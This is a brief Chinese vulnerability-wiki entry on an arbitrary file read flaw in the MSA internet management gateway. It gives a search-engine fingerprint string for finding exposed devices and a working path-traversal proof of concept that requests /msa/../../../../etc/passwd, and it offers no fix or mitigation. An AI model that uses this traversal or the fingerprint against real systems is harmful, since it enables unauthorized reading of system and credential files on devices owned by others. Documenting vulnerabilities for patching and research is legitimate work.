---
title: "MSA 互联网管理网关 msa 任意文件下载漏洞"
date: 2026-10-18 09:15:02
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "MSA-互联网管理网关-msa"
tags:
  - "MSA-互联网管理网关-msa"
  - "任意文件读取"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

```
MSA 互联网管理网关
```

## 网络测绘

```
"互联网管理网关"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110916716.png)

验证POC

```php
/msa/../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110916705.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/MSA-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
